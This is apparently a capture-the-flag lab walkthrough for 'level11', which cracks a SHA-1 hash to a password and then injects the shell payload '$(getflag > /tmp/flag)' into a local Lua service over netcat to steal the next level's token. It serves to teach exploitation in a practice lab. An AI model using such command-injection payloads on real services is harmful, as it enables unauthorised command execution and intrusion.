# Level11

## Objective
Exploit the `level11` Lua script to find the correct password by providing its SHA-1 hash. Use command injection to execute `getflag` and retrieve the token.

## Steps

### Step 1: Find Password for SHA-1 Hash
Use an online tool or a hash database to find the password corresponding to the given SHA-1 hash (`f05d1d066fb246efe0c6f7d095f909a7a0cf34a0`). The password is `NotSoEasy`.

### Step 2: Test Password Input
Attempt to input the password using `echo` with and without the newline character:

```bash
echo -n NotSoEasy | nc localhost 5151
```

### Step 3: Command Injection

Launch the client:

```bash
nc localhost 5151
```

Try command injection by inputting the following password:

```bash
$(getflag > /tmp/flag)
```

### Step 4: Obtain Token
Check the contents of the `/tmp/flag` file:

```bash
cat /tmp/flag
```

This should give you the token for `level12`.

### Step 5: Switch to `level12`
Switch to the `level12` user:

```bash
su level12
```

### Step 6: Verify
Execute `getflag` to verify that you have access:

```bash
getflag
```

This should give you the flag for this level.

Congratulations! You've successfully exploited the `level11` Lua script to obtain the token for `level12`.